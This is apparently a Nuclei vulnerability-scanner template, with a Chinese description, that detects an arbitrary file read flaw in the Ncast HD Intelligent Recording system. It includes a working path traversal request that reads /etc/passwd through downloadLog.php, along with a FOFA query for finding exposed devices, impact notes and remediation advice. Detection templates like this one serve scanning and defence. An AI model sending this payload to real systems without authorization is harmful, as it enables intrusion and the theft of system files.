id: ncast-lfi

info:
  name: Ncast HD Intelligent Recording - 任意文件读取漏洞
  author: pussycat0x
  severity: high
  description: |
    该模板用于检测 Ncast HD Intelligent Recording - 任意文件读取漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/developLog/downloadLog.php?name=../../../../etc/passwd` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://github.com/wy876/POC/blob/main/Ncast%E9%AB%98%E6%B8%85%E6%99%BA%E8%83%BD%E5%BD%95%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  classification:
    cpe: cpe:2.3:a:ncast_project:ncast:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: ncast_project
    product: ncast
    fofa-query: app="Ncast-产品" && title=="高清智能录播系统"
  tags: ncast,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/developLog/downloadLog.php?name=../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: content_type
        words:
          - "application/force-download"

      - type: status
        status:
          - 200
